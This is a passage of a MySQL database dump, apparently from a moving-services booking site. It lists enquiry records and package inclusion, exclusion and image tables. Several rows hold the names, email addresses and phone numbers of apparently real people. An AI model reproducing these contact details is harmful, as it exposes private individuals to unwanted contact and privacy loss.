(119, 'hitesh', 0, 43, 60, 0, 'devang.hnrtechnologies@gmail.com', '9033259413', 0, 0, '2024-04-03', 0, NULL),
(120, 'hitesh', 0, 43, 60, 0, 'devang.hnrtechnologies@gmail.com', '9033259413', 0, 0, '2024-04-03', 0, NULL),
(121, 'hitesh', 0, 43, 60, 0, 'devang.hnrtechnologies@gmail.com', '9033259413', 0, 0, '2024-04-03', 0, NULL),
(122, 'hitesh', 0, 43, 60, 0, 'devang.hnrtechnologies@gmail.com', '9033259413', 0, 0, '2024-04-03', 0, NULL),
(123, 'hitesh', 0, 43, 60, 0, 'devang.hnrtechnologies@gmail.com', '9033259413', 0, 0, '2024-04-03', 0, NULL),
(124, '', 0, 30, 23, 0, '', '', 0, 0, '2024-04-04', 0, NULL),
(125, 'Suhaan', 0, 30, 26, 0, 'suhaanmukadam007@gmail.com', '0585200722', 0, 0, '2024-04-04', 0, NULL),
(126, 'Suhaan', 0, 30, 23, 0, 'suhaanmukadam007@gmail.com', '0585200722', 0, 0, '2024-04-04', 0, NULL),
(127, 'hitesh', 0, 43, 60, 0, 'devang.hnrtechnologies@gmail.com', '9033259413', 0, 0, '2024-04-08', 0, NULL),
(128, 'hitesh', 0, 43, 60, 0, 'devang.hnrtechnologies@gmail.com', '9033259413', 0, 0, '2024-04-08', 0, NULL),
(129, 'hitesh', 0, 30, 23, 0, 'devang.hnrtechnologies@gmail.com', '9033259413', 0, 0, '2024-04-27', 1, NULL),
(130, 'Mayudin', 0, 30, 23, 0, 'mayudin1904@gmail.com', '7990739286', 0, 0, '2024-04-27', 0, NULL),
(131, 'hitesh', 0, 30, 23, 0, 'devang.hnrtechnologies@gmail.com', '9033259413', 0, 0, '2024-04-29', 0, NULL),
(132, 'hitesh', 0, 30, 23, 0, 'mayudin.hnrtechnologies@gmail.com', '9033259413', 0, 0, '2024-04-29', 0, NULL),
(133, 'hitesh', 0, 30, 23, 0, 'mayudin.hnrtechnologies@gmail.com', '9033259413', 0, 0, '2024-04-29', 0, NULL),
(134, 'hitesh', 0, 44, 61, 0, 'devang.hnrtechnologies@gmail.com', '9033259413', 0, 0, '2024-04-29', 0, NULL),
(135, 'hitesh', 0, 45, 28, 0, 'devang.hnrtechnologies@gmail.com', '9033259413', 0, 0, '2024-04-29', 0, NULL),
(136, 'hitesh', 0, 45, 30, 0, 'devang.hnrtechnologies@gmail.com', '9033259413', 0, 0, '2024-04-29', 0, NULL),
(137, 'hitesh', 0, 45, 30, 0, 'devang.hnrtechnologies@gmail.com', '9033259413', 0, 0, '2024-04-29', 0, NULL),
(138, 'hitesh', 0, 45, 33, 0, 'devang.hnrtechnologies@gmail.com', '9033259413', 0, 0, '2024-04-29', 0, NULL),
(139, 'hitesh', 0, 45, 33, 0, 'devang.hnrtechnologies@gmail.com', '9033259413', 0, 0, '2024-04-29', 0, NULL),
(140, 'hitesh', 0, 30, 31, 0, 'mayudin.hnrtechnologies@gmail.com', '9033259413', 0, 0, '2024-05-01', 1, NULL),
(141, 'hitesh', 0, 30, 23, 0, 'devang.hnrtechnologies@gmail.com', '9033259413', 0, 0, '2024-05-01', 0, NULL),
(142, 'hitesh', 0, 30, 23, 0, 'devang.hnrtechnologies@gmail.com', '9033259413', 0, 0, '2024-05-01', 0, NULL),
(143, 'hitesh', 0, 30, 31, 0, 'devang.hnrtechnologies@gmail.com', '9033259413', 0, 0, '2024-05-01', 1, NULL),
(144, 'hitesh', 0, 30, 23, 0, 'mayudin.hnrtechnologies@gmail.com', '9033259413', 0, 0, '2024-05-01', 0, NULL),
(145, 'hitesh', 0, 30, 23, 0, 'mayudin.hnrtechnologies@gmail.com', '9033259413', 0, 0, '2024-05-01', 0, NULL),
(146, 'hitesh', 0, 30, 23, 0, 'mayudin.hnrtechnologies@gmail.com', '9033259413', 0, 0, '2024-05-01', 0, NULL),
(147, 'hitesh', 0, 30, 23, 0, 'mayudin.hnrtechnologies@gmail.com', '9033259413', 0, 0, '2024-05-01', 0, NULL),
(148, 'hitesh', 0, 44, 61, 0, 'mayudin.hnrtechnologies@gmail.com', '9033259413', 0, 0, '2024-05-01', 0, NULL),
(149, 'hitesh', 0, 45, 28, 0, 'mayudin.hnrtechnologies@gmail.com', '9033259413', 0, 0, '2024-05-01', 0, NULL),
(150, 'hitesh', 0, 30, 23, 0, 'devang.hnrtechnologies@gmail.com', '9033259413', 0, 0, '2024-05-02', 0, NULL),
(151, 'hitesh', 0, 45, 28, 0, 'devang.hnrtechnologies@gmail.com', '9033259413', 0, 0, '2024-05-02', 0, NULL),
(152, '', 0, 30, 23, 0, 'devang.hnrtechnologies@gmail.com', '', 0, 0, '2024-05-04', 0, 'Local Move'),
(153, 'Nikul Patel', 0, 30, 23, 0, 'patelnikul321@gmail.com', '8097517477', 0, 0, '2024-05-11', 0, NULL),
(154, 'Nikul Patel', 0, 30, 23, 0, 'patelnikul321@gmail.com', '8097517477', 0, 0, '2024-05-11', 0, NULL),
(155, 'Mayudin', 0, 30, 31, 0, 'mayudin1904@gmail.com', '7990739286', 0, 0, '2024-05-13', 3, NULL),
(156, 'hitesh', 0, 30, 31, 0, 'devang.hnrtechnologies@gmail.com', '9033259413', 0, 0, '2024-05-14', 1, NULL),
(157, 'Nikul Patel', 0, 30, 26, 0, 'patelnikul321@gmail.com', '8097517477', 0, 0, '2024-05-18', 1, NULL),
(158, 'Nikul Patel', 0, 45, 30, 0, 'patelnikul321@gmail.com', '8097517477', 0, 0, '2024-05-18', 1, NULL),
(159, 'hitesh', 0, 30, 23, 0, 'devang.hnrtechnologies@gmail.com', '9033259413', 0, 0, '2024-05-18', 1, NULL),
(160, 'Nikul Patel', 0, 30, 23, 0, 'patelnikul321@gmail.com', '8097517477', 0, 0, '2024-05-18', 1, NULL),
(161, '', 0, 30, 23, 0, '', '', 0, 0, '2024-05-18', 0, NULL),
(162, 'mayudin', 0, 30, 23, 0, 'mayudin.hnrtechnologies@gmail.com', '7990739286', 0, 0, '2024-05-21', 0, NULL),
(163, 'mayudin', 0, 30, 23, 0, 'mayudin.hnrtechnologies@gmail.com', '7990739286', 0, 0, '2024-05-21', 0, NULL),
(164, 'mayudin', 0, 30, 23, 0, 'mayudin.hnrtechnologies@gmail.com', '7990739286', 0, 0, '2024-05-21', 0, NULL),
(165, 'mayudin', 0, 30, 23, 0, 'mayudin.hnrtechnologies@gmail.com', '7990739286', 0, 0, '2024-05-21', 0, NULL),
(166, 'mayudin', 0, 30, 23, 0, 'mayudin.hnrtechnologies@gmail.com', '7990739286', 0, 0, '2024-05-29', 0, NULL),
(167, 'Abhishhek', 0, 30, 23, 0, 'abhishek.hnrtechnologies@gmail.com', '1234567890', 0, 0, '2024-05-29', 0, NULL),
(168, 'Suhaan', 0, 30, 23, 0, 'suhaanmukadam007@gmail.com', '0585200722', 0, 0, '2024-05-29', 0, NULL),
(169, 'Abhishhek', 0, 30, 23, 0, 'abhishek.hnrtechnologies@gmail.com', '1234567890', 0, 0, '2024-05-29', 0, NULL),
(170, 'Abhishhek', 0, 30, 23, 0, 'abhishek.hnrtechnologies@gmail.com', '1234567890', 0, 0, '2024-05-29', 0, NULL),
(171, 'Abhishhek', 0, 30, 23, 0, 'abhishek.hnrtechnologies@gmail.com', '1234567890', 0, 0, '2024-05-29', 0, NULL),
(172, 'Abhishhek', 0, 30, 23, 0, 'abhishek.hnrtechnologies@gmail.com', '1234567890', 0, 0, '2024-05-29', 0, NULL),
(173, 'mayudin', 0, 30, 23, 0, 'mayudin.hnrtechnologies@gmail.com', '7990739286', 0, 0, '2024-05-29', 0, NULL),
(174, 'Abhishek', 0, 30, 23, 0, 'abhishek.hnrtechnologies@gmail.com', '1234567890', 0, 0, '2024-05-29', 0, NULL),
(175, 'Abhishek', 0, 30, 23, 0, 'abhishek.hnrtechnologies@gmail.com', '1234567890', 0, 0, '2024-05-29', 0, NULL),
(176, '', 0, 44, 61, 0, '', '', 0, 0, '2024-05-29', 0, NULL),
(177, 'Zafar', 0, 30, 23, 0, 'zafar@quickserverelo.com', '0508807610', 0, 0, '2024-05-30', 0, NULL),
(178, 'Zafar', 0, 30, 23, 0, 'zafar@quickserverelo.com', '0508807610', 0, 0, '2024-05-30', 0, NULL),
(179, 'Abhishek', 0, 30, 26, 0, 'abhishek.hnrtechnologies@gmail.com', '1234567890', 0, 0, '2024-05-30', 0, NULL),
(180, 'Abhishek', 0, 30, 26, 0, 'abhishek.hnrtechnologies@gmail.com', '1234567890', 0, 0, '2024-05-30', 0, NULL),
(181, '', 0, 45, 28, 0, '', '', 0, 0, '2024-05-30', 0, NULL),
(182, 'Zafar', 0, 30, 23, 0, 'zafar@quickserverelo.com', '0508807610', 0, 0, '2024-05-31', 0, NULL),
(183, 'Abhishek', 0, 30, 23, 0, 'abhishek.hnrtechnologies@gmail.com', '1234567890', 0, 0, '2024-06-01', 0, NULL),
(184, '', 0, 45, 28, 0, '', '', 0, 0, '2024-06-01', 0, NULL),
(185, 'Abhishek', 0, 30, 26, 0, 'abhishek.hnrtechnologies@gmail.com', '1234678905', 0, 0, '2024-06-01', 0, NULL),
(186, 'Abhishek', 0, 30, 26, 0, 'abhishek.hnrtechnologies@gmail.com', '1234678905', 0, 0, '2024-06-01', 0, NULL),
(187, 'Abhishek', 0, 30, 26, 0, 'abhishek.hnrtechnologies@gmail.com', '1234678905', 0, 0, '2024-06-01', 0, NULL),
(188, 'Abhishek', 0, 30, 26, 0, 'abhishek.hnrtechnologies@gmail.com', '1234678905', 0, 0, '2024-06-01', 0, NULL),
(189, 'Abhishek', 0, 30, 26, 0, 'abhishek.hnrtechnologies@gmail.com', '1234678905', 0, 0, '2024-06-01', 0, NULL),
(190, 'Abhishek', 0, 30, 26, 0, 'abhishek.hnrtechnologies@gmail.com', '1234678905', 0, 0, '2024-06-01', 0, NULL),
(191, 'Abhishek', 0, 30, 26, 0, 'abhishek.hnrtechnologies@gmail.com', '1234678905', 0, 0, '2024-06-01', 0, NULL),
(192, 'Abhishek', 0, 30, 26, 0, 'abhishek.hnrtechnologies@gmail.com', '1234678905', 0, 0, '2024-06-01', 0, NULL),
(193, 'hitesh', 0, 30, 23, 0, 'devang.hnrtechnologies@gmail.com', '9033259413', 0, 0, '2024-06-01', 1, NULL),
(194, 'hitesh', 0, 30, 23, 0, 'devang.hnrtechnologies@gmail.com', '9033259413', 0, 0, '2024-06-01', 1, NULL),
(195, 'hitesh', 0, 45, 28, 0, 'devang.hnrtechnologies@gmail.com', '9033259413', 0, 0, '2024-06-03', 0, NULL),
(196, 'Abhishek', 0, 30, 23, 0, 'abhishek.hnrtechnologies@gmail.com', '1234678905', 0, 0, '2024-06-04', 1, NULL),
(197, 'Abhishek', 0, 30, 23, 0, 'abhishek.hnrtechnologies@gmail.com', '1234678905', 0, 0, '2024-06-04', 1, 'Local Move'),
(198, 'Abhishek', 0, 30, 26, 0, 'abhishek.hnrtechnologies@gmail.com', '1234678905', 0, 0, '2024-06-04', 1, ' International Move'),
(199, 'Abhishek', 0, 30, 23, 0, 'abhishek.hnrtechnologies@gmail.com', '1234678905', 0, 0, '2024-06-04', 1, ' International Move'),
(200, 'Abhishek', 0, 44, 61, 0, 'abhishek.hnrtechnologies@gmail.com', '1234678905', 0, 0, '2024-06-04', 0, 'Local Move'),
(201, 'Abhishek', 0, 30, 23, 0, 'abhishek.hnrtechnologies@gmail.com', '1234678905', 0, 0, '2024-06-04', 1, NULL),
(202, 'Abhishek', 0, 30, 23, 0, 'abhishek.hnrtechnologies@gmail.com', '1234678905', 0, 0, '2024-06-04', 1, 'Local Move'),
(203, 'Abhishek', 0, 30, 23, 0, 'abhishek.hnrtechnologies@gmail.com', '1234678905', 0, 0, '2024-06-04', 1, 'Local Move'),
(204, 'Abhishek', 0, 30, 23, 0, 'abhishek.hnrtechnologies@gmail.com', '1234678905', 0, 0, '2024-06-04', 1, 'International Move'),
(205, 'Abhishek', 0, 44, 62, 0, 'abhishek.hnrtechnologies@gmail.com', '1234678905', 0, 0, '2024-06-04', 4, NULL),
(206, 'Abhishek', 0, 44, 62, 0, 'abhishek.hnrtechnologies@gmail.com', '1234678905', 0, 0, '2024-06-04', 1, NULL),
(207, 'Abhishek', 0, 30, 23, 0, 'abhishek.hnrtechnologies@gmail.com', '1234678905', 0, 0, '2024-06-05', 1, 'Local Move'),
(208, 'Abhishek', 0, 30, 23, 0, 'abhishek.hnrtechnologies@gmail.com', '1234678905', 0, 0, '2024-06-05', 0, NULL),
(209, 'mayudin', 0, 30, 23, 0, 'mayudin.hnrtechnologies@gmail.com', '7990739286', 0, 0, '2024-06-05', 0, NULL),
(210, 'mayudin', 0, 30, 26, 0, 'mayudin.hnrtechnologies@gmail.com', '7990739286', 0, 0, '2024-06-05', 0, NULL),
(211, 'mayudin', 0, 30, 26, 0, 'mayudin.hnrtechnologies@gmail.com', '7990739286', 0, 0, '2024-06-05', 0, NULL),
(212, 'mayudin', 0, 30, 26, 0, 'mayudin.hnrtechnologies@gmail.com', '7990739286', 0, 0, '2024-06-05', 0, NULL),
(213, 'mayudin', 0, 30, 26, 0, 'mayudin.hnrtechnologies@gmail.com', '7990739286', 0, 0, '2024-06-05', 1, 'Local Move'),
(214, 'mayudin', 0, 44, 62, 0, 'mayudin.hnrtechnologies@gmail.com', '7990739286', 0, 0, '2024-06-05', 1, NULL),
(215, 'Abhishek', 0, 30, 23, 0, 'abhishek.hnrtechnologies@gmail.com', '1234678905', 0, 0, '2024-06-05', 0, 'Local Move'),
(216, 'Abhishek', 0, 30, 26, 0, 'abhishek.hnrtechnologies@gmail.com', '1234678905', 0, 0, '2024-06-05', 0, 'International Move'),
(217, 'Abhishek', 0, 30, 23, 0, 'abhishek.hnrtechnologies@gmail.com', '1234678905', 0, 0, '2024-06-05', 1, 'Local Move'),
(218, 'Abhishek', 0, 30, 23, 0, 'abhishek.hnrtechnologies@gmail.com', '1234678905', 0, 0, '2024-06-05', 1, 'Local Move'),
(219, 'Abhishek', 0, 30, 26, 0, 'abhishek.hnrtechnologies@gmail.com', '1234678905', 0, 0, '2024-06-05', 0, 'Local Move'),
(220, 'Abhishek', 0, 30, 23, 0, 'abhishek.hnrtechnologies@gmail.com', '1234678905', 0, 0, '2024-06-06', 0, 'Local Move'),
(221, 'Abhishek', 0, 30, 23, 0, 'abhishek.hnrtechnologies@gmail.com', '1234678905', 0, 0, '2024-06-06', 0, 'Local Move'),
(222, 'Abhishek', 0, 30, 23, 0, 'abhishek.hnrtechnologies@gmail.com', '1234678905', 0, 0, '2024-06-06', 0, 'Local Move'),
(223, 'Abhishek', 0, 30, 23, 0, 'abhishek.hnrtechnologies@gmail.com', '1234678905', 0, 0, '2024-06-06', 0, 'Local Move'),
(224, 'Abhishek', 0, 30, 23, 0, 'abhishek.hnrtechnologies@gmail.com', '1234678905', 0, 0, '2024-06-06', 0, 'Local Move'),
(225, 'Abhishek', 0, 30, 23, 0, 'abhishek.hnrtechnologies@gmail.com', '1234678905', 0, 0, '2024-06-06', 0, 'Local Move'),
(226, 'Abhishek', 0, 30, 23, 0, 'abhishek.hnrtechnologies@gmail.com', '1234678905', 0, 0, '2024-06-06', 1, 'Local Move'),
(227, 'Abhishek', 0, 30, 23, 0, 'abhishek.hnrtechnologies@gmail.com', '1234678905', 0, 0, '2024-06-06', 0, 'International Move'),
(228, 'Abhishek', 0, 30, 23, 0, 'abhishek.hnrtechnologies@gmail.com', '1234678905', 0, 0, '2024-06-06', 0, 'Local Move'),
(229, 'Abhishek', 0, 30, 23, 0, 'abhishek.hnrtechnologies@gmail.com', '1234678905', 0, 0, '2024-06-06', 0, 'Local Move'),
(230, 'Abhishek', 0, 30, 23, 0, 'abhishek.hnrtechnologies@gmail.com', '1234678905', 0, 0, '2024-06-06', 0, 'Local Move'),
(231, 'Abhishek', 0, 30, 23, 0, 'abhishek.hnrtechnologies@gmail.com', '1234678905', 0, 0, '2024-06-06', 0, 'Local Move'),
(232, 'Abhishek', 0, 30, 23, 0, 'abhishek.hnrtechnologies@gmail.com', '1234678905', 0, 0, '2024-06-06', 0, 'Local Move'),
(233, 'adarsh', 0, 30, 23, 0, 'adarsh.hnrtechnologies@gmail.com', '1234567890', 0, 0, '2024-06-06', 1, 'Local Move'),
(234, 'hitesh', 0, 30, 23, 0, 'devang.hnrtechnologies@gmail.com', '9033259413', 0, 0, '2024-06-06', 0, 'Local Move'),
(235, 'hitesh', 0, 30, 23, 0, 'devang.hnrtechnologies@gmail.com', '9033259413', 0, 0, '2024-06-06', 1, 'Local Move'),
(236, 'Abhishek', 0, 30, 23, 0, 'abhishek.hnrtechnologies@gmail.com', '1234678905', 0, 0, '2024-06-07', 0, 'Local Move'),
(237, 'Abhishek', 0, 30, 23, 0, 'abhishek.hnrtechnologies@gmail.com', '1234678905', 0, 0, '2024-06-07', 0, 'Local Move'),
(238, 'Suhaan', 0, 30, 23, 0, 'suhaanmukadam007@gmail.com', '0585200722', 0, 0, '2024-06-07', 0, 'Local Move'),
(239, '', 0, 30, 23, 0, '', '', 0, 0, '2024-06-07', 0, 'Local Move'),
(240, 'hitesh', 0, 30, 23, 0, 'devang.hnrtechnologies@gmail.com', '9033259413', 0, 0, '2024-06-08', 0, 'Local Move'),
(241, 'Suhaan', 0, 30, 23, 0, 'suhaanmukadam007@gmail.com', '0585200722', 0, 0, '2024-06-08', 0, 'International Move'),
(242, 'ZAFFAR MUKADAM', 0, 30, 31, 0, 'ZAFAR@QUICKSERVERELO.COM', '0508007610', 0, 0, '2024-06-15', 0, 'Local Move'),
(243, 'Suhaan Mukadam', 0, 30, 23, 0, 'suhaan@vendorscity.com', '0585200722', 0, 0, '2024-06-15', 0, 'Local Move'),
(244, 'Suhaan Mukadam', 0, 30, 23, 0, 'suhaan@vendorscity.com', '0585200722', 0, 0, '2024-06-15', 0, 'Local Move'),
(245, 'Suhaan Mukadam', 0, 30, 23, 0, 'suhaan@vendorscity.com', '0585200722', 0, 0, '2024-06-15', 0, 'Local Move'),
(246, '', 0, 30, 23, 0, '', '', 0, 0, '2024-06-18', 0, 'Local Move'),
(247, 'hitesh', 0, 30, 23, 0, 'devang.hnrtechnologies@gmail.com', '9033259413', 0, 0, '2024-06-18', 0, 'Local Move'),
(248, 'hitesh', 0, 30, 23, 0, 'devang.hnrtechnologies@gmail.com', '9033259413', 0, 0, '2024-06-18', 0, 'Local Move'),
(249, 'hitesh', 0, 30, 26, 0, 'devang.hnrtechnologies@gmail.com', '9033259413', 0, 0, '2024-06-18', 0, 'Local Move'),
(250, 'hitesh', 0, 30, 23, 0, 'devang.hnrtechnologies@gmail.com', '9033259413', 0, 0, '2024-06-19', 0, 'Local Move'),
(251, 'hitesh', 0, 30, 23, 0, 'devang.hnrtechnologies@gmail.com', '9033259413', 0, 0, '2024-06-19', 0, 'Local Move'),
(252, 'hitesh', 0, 30, 23, 0, 'devang.hnrtechnologies@gmail.com', '9033259413', 0, 0, '2024-06-19', 0, 'Local Move'),
(253, '', 0, 30, 31, 0, '', '', 0, 0, '2024-06-20', 0, 'Local Move'),
(254, 'hitesh', 0, 30, 31, 0, 'devang.hnrtechnologies@gmail.com', '9033259413', 0, 0, '2024-06-22', 0, 'Local Move'),
(255, 'Nikul Patel', 0, 30, 31, 0, 'patelnikul321@gmail.com', '8097517477', 0, 0, '2024-06-22', 0, 'Local Move');

-- --------------------------------------------------------

--
-- Table structure for table `packages_excluser`
--

CREATE TABLE `packages_excluser` (
  `id` int(11) NOT NULL,
  `pid` int(11) NOT NULL,
  `excluser_name` varchar(255) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

--
-- Dumping data for table `packages_excluser`
--

INSERT INTO `packages_excluser` (`id`, `pid`, `excluser_name`) VALUES
(1, 14, 'test 123'),
(3, 16, 'test Excluser 1bc'),
(4, 16, 'test Excluser 222'),
(5, 16, '123456'),
(19, 12, 'Only one truckload'),
(20, 12, 'No extra rooms'),
(21, 6, 'Only one truckload'),
(22, 6, 'No extra rooms'),
(23, 11, 'Only one truckload'),
(24, 11, 'No extra rooms'),
(25, 10, 'Only one truckload'),
(26, 10, 'No extra rooms'),
(27, 5, 'Only one truckload'),
(28, 5, 'No extra rooms'),
(29, 13, 'Excluser Name 1'),
(30, 13, 'Excluser Name 2'),
(31, 15, 'excluser 1'),
(32, 15, 'excluser 2'),
(33, 16, 'Handyman'),
(34, 17, 'Boxes'),
(35, 17, 'Handyman'),
(36, 18, 'Test-1'),
(37, 18, 'Test-2'),
(38, 18, 'Test-3'),
(41, 20, 'Insurance'),
(42, 21, '📦 Boxes (Offered Separately)'),
(43, 21, '🔨 Handyman'),
(44, 22, '🔨 Handyman'),
(45, 22, '🛡️ Insurance (Offered Separately)'),
(46, 21, '🛠️ 1 | Installer'),
(47, 23, '🛡️ Insurance (Offered Separately)'),
(48, 25, '📦 Boxes (Offered Separately)'),
(49, 25, '🔨 Handyman '),
(50, 25, '🛠️ 1 | Installer'),
(51, 26, '🔨 Handyman'),
(52, 26, '🛡️ Insurance (Offered Separately)'),
(53, 25, '🛡️ Insurance (Offered Separately)'),
(54, 21, '🛡️ Insurance (Offered Separately)'),
(55, 27, '🛡️ Insurance (Offered Separately)'),
(56, 28, '📦 Boxes (Offered Separately)'),
(57, 28, '🔨 Handyman'),
(58, 28, '🛠️ 1 | Installer'),
(59, 28, '🛡️ Insurance (Offered Separately)'),
(60, 29, '🔨 Handyman'),
(61, 29, '🛡️ Insurance (Offered Separately)'),
(62, 30, '🛡️ Insurance (Offered Separately)'),
(63, 31, '📦 Boxes (Offered Separately)'),
(64, 31, '🔨 Handyman'),
(65, 31, '🛠️ 2 | Installers'),
(66, 31, '🛡️ Insurance (Offered Separately)'),
(67, 32, '🔨 Handyman'),
(68, 32, '🛡️ Insurance (Offered Separately)'),
(69, 33, '🛡️ Insurance (Offered Separately)'),
(70, 34, '📦 Boxes (Offered Separately)'),
(71, 34, '🔨 Handyman'),
(72, 34, '🛠️ 2 | Installers'),
(73, 34, '🛡️ Insurance (Offered Separately)'),
(74, 35, '🔨 Handyman'),
(75, 35, '🛡️ Insurance (Offered Separately)'),
(76, 36, '🛡️ Insurance (Offered Separately)'),
(77, 37, '📦 Boxes (Offered Separately)'),
(78, 37, '🔨 Handyman'),
(79, 37, '🛠️ 2 | Installers'),
(80, 37, '🛡️ Insurance (Offered Separately)'),
(81, 38, '🔨 Handyman'),
(82, 38, '🛡️ Insurance (Offered Separately)'),
(83, 39, '🛡️ Insurance (Offered Separately)'),
(84, 40, '📦 Boxes (Offered Separately)'),
(85, 40, '🔨 Handyman'),
(86, 40, '🛠️ 2 | Installers'),
(87, 40, '🛡️ Insurance (Offered Separately)'),
(88, 41, '🔨 Handyman'),
(89, 41, '🛡️ Insurance (Offered Separately)'),
(90, 42, '🛡️ Insurance (Offered Separately)'),
(91, 43, '📦 Boxes (Offered Separately)'),
(92, 43, '🔨 Handyman'),
(93, 43, '🛠️ 2 | Installers'),
(94, 43, '🛡️ Insurance (Offered Separately)'),
(95, 44, '🔨 Handyman'),
(96, 44, '🛡️ Insurance (Offered Separately)'),
(97, 45, '🛡️ Insurance (Offered Separately)'),
(98, 46, 'b');

-- --------------------------------------------------------

--
-- Table structure for table `packages_image`
--

CREATE TABLE `packages_image` (
  `id` int(11) NOT NULL,
  `pid` int(11) NOT NULL,
  `image` varchar(255) NOT NULL,
  `created_at` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP,
  `updated_at` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

--
-- Dumping data for table `packages_image`
--

INSERT INTO `packages_image` (`id`, `pid`, `image`, `created_at`, `updated_at`) VALUES
(17, 11, '1702373370-how-to-pack-and-move-studio-room.jpg', '2023-12-12 09:29:30', '2023-12-12 09:29:30'),
(18, 11, '1702373421-Rectangle_2.png', '2023-12-12 09:30:23', '2023-12-12 09:30:23'),
(19, 10, '1702373607-01-Moving-Into-a-New-Apartment-Take-Photos-of-These-5-Things-Right-Away-shutterstock_547444582-1.jpg', '2023-12-12 09:33:27', '2023-12-12 09:33:27'),
(20, 10, '1702373623-AT_Gallery_Portrait.png', '2023-12-12 09:33:45', '2023-12-12 09:33:45'),
(21, 6, '1702373684-CORT-Sharing-a-Studio-Apartment-as-a-Couple-1200x580.jpg', '2023-12-12 09:34:45', '2023-12-12 09:34:45'),
(22, 6, '1702373695-coral-three-bedroom-villa-exterior-night-shot_WIDE-LARGE-16-9.png', '2023-12-12 09:34:59', '2023-12-12 09:34:59'),
(23, 5, '1702373737-Family-moving-boxes-together.jpg', '2023-12-12 09:35:37', '2023-12-12 09:35:37'),
(24, 5, '1702373760-Decor_Couple.jpg', '2023-12-12 09:36:00', '2023-12-12 09:36:00'),
(25, 5, '1702373784-612.-Average-cost-to-move-1-bedroom-apartment.png', '2023-12-12 09:36:30', '2023-12-12 09:36:30');

-- --------------------------------------------------------

--
-- Table structure for table `packages_incluser`
--

CREATE TABLE `packages_incluser` (
  `id` int(11) NOT NULL,
  `pid` int(11) NOT NULL,
  `incluser_name` varchar(255) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

--
-- Dumping data for table `packages_incluser`
--

INSERT INTO `packages_incluser` (`id`, `pid`, `incluser_name`) VALUES
(1, 13, 'test 1'),
(2, 13, 'test 2'),
(3, 13, 'test 4'),
(10, 14, 'test'),
(11, 14, '123456789'),
(12, 15, 'Incluser  1'),
(14, 16, 'test incluser 1ab'),
(19, 16, 'test incluser 2'),
(26, 12, 'Trusted professionals'),
(27, 12, '100% satisfaction guaranteed'),
(28, 6, 'Trusted professionals'),
(29, 6, '100% satisfaction guaranteed'),
(30, 11, 'Trusted professionals'),
(31, 11, '100% satisfaction guaranteed'),
(32, 10, 'Trusted professionals'),
(33, 10, '100% satisfaction guaranteed'),
(34, 5, 'Trusted professionals'),
(35, 5, '100% satisfaction guaranteed'),
(36, 13, 'Incluser Name 1'),
(38, 15, 'test incluser 1'),
(39, 15, 'test incluser 2'),
(40, 16, 'Packing'),
(41, 17, '1 | 3 Ton Pick up'),
(42, 17, '2 | Helpers'),
(43, 17, 'White Goods Connection'),
(44, 17, 'Dismantling & Assembly'),
(45, 18, 'Test-1'),
(46, 18, 'Test-2'),
(47, 18, 'Test-3'),
(48, 19, '1 | 3 Ton Pick up'),
(49, 19, '2 | Helpers'),
(52, 20, '1 | 3-Ton Truck'),
(53, 20, '2 | Helpers'),
(54, 20, '1 | Installer'),
(55, 20, 'White Goods Connection'),
(56, 20, 'Dismantling & Assembly'),
(57, 20, 'Boxes'),
(58, 20, 'Handyman'),
(59, 21, '🚛  1 | 3-Ton Closed Truck'),
(60, 21, '👥 2 | Helpers'),
(62, 21, '🔧 Dismantling & Assembly'),
(63, 22, '🚛 1 | 3-Ton Closed Truck'),
(64, 22, '👥 2 | Helpers'),
(65, 22, '🛠️ 1 | Installer'),
(66, 22, '🔄 White Goods Connection'),
(67, 22, '🔧 Dismantling & Assembly'),
(68, 22, '📦 Boxes '),
(69, 23, '🚛 1 | 3-Ton Closed Truck'),
(70, 23, '👥 2 | Helpers '),
(71, 23, '🛠️ 1 | Installer'),
(72, 23, '🔄 White Goods Connection'),
(73, 23, '🔧 Dismantling & Assembly'),
(74, 23, '📦 Boxes '),
(75, 23, '🔨 Handyman'),
(76, 21, '🔄  White Goods Connection'),
(77, 25, '🚛 1 | 3-Ton Closed Truck'),
(78, 25, '👥 3 | Helpers'),
(79, 25, '🔄 White Goods Connection'),
(80, 25, '🔧 Dismantling & Assembly'),
(81, 26, '🚛 1 | 3-Ton Closed Truck'),
(82, 26, '👥 3 | Helpers'),
(83, 26, '🛠️ 1 | Installer'),
(84, 26, '🔄 White Goods Connection'),
(85, 26, '🔧 Dismantling & Assembly'),
(86, 26, '📦 Boxes'),
(87, 27, '🚛 1 | 3-Ton Closed Truck'),
(88, 27, '👥 3 | Helpers'),
(89, 27, '🛠️ 1 | Installer'),
(90, 27, '🔄 White Goods Connection'),
(91, 27, '🔧 Dismantling & Assembly'),
(92, 27, '📦 Boxes'),
(93, 27, '🔨 Handyman services'),
(94, 28, '🚛 2 | 3-Ton Closed Truck'),
(95, 28, '👥 5 | Helpers'),
(96, 28, '🔄 White Goods Connection'),
(97, 28, '🔧 Dismantling & Assembly'),
(98, 29, '🚛 2 | 3-Ton Closed Truck'),
(99, 29, '👥 6 | Helpers'),
(100, 29, '🛠️ 1 | Installer'),
(101, 29, '🔄 White Goods Connection'),
(102, 29, '🔧 Dismantling & Assembly'),
(103, 29, '📦 Boxes'),
(104, 30, '🚛 2 | 3-Ton Closed Truck'),
(105, 30, '👥 7 | Helpers'),
(106, 30, '🛠️ 1 | Installer'),
(107, 30, '🔄 White Goods Connection'),
(108, 30, '🔧 Dismantling & Assembly'),
(109, 30, '📦 Boxes'),
(110, 30, '🔨 Handyman services'),
(111, 31, '🚛 2 | 3-Ton Closed Truck'),
(112, 31, '👥 7 | Helpers'),
(113, 31, '🔄 White Goods Connection'),
(114, 31, '🔧 Dismantling & Assembly'),
(115, 32, '🚛 3 | 3-Ton Closed Truck'),
(116, 32, '👥 7 | Helpers'),
(117, 32, '🛠️ 2 | Installers'),
(118, 32, '🔄 White Goods Connection'),
(119, 32, '🔧 Dismantling & Assembly'),
(120, 32, '📦 Boxes'),
(121, 33, '🚛 3 | 3-Ton Closed Truck'),
(122, 33, '👥 8 | Helpers'),
(123, 33, '🛠️ 2 | Installers'),
(124, 33, '🔄 White Goods Connection'),
(125, 33, '🔧 Dismantling & Assembly'),
(126, 33, '📦 Boxes'),
(127, 33, '🔨 Handyman'),
(128, 34, '🚛 4 | 3-Ton Closed Truck'),
(129, 34, '👥 10 | Helpers'),
